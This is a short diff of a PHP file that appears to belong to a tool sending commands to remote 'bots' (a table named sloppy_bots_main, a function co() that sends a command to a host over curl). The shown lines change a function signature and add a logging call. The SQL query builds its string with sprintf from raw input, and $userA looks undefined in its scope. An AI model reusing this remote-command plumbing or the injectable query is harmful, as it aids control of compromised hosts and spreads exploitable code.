@@ -145,7 +145,7 @@ function opts()
     echo "\n";
 }
 
-function sys($host, $uri)
+function sys($host)
 {
     if (!empty($host) && !empty($userA)) {
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
@@ -234,6 +234,7 @@ function co($command, $host, bool $encrypt)
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
+                    logo('co', clears, false, '', $axX[0]);
                     echo $syst;
                     break;
                 default:
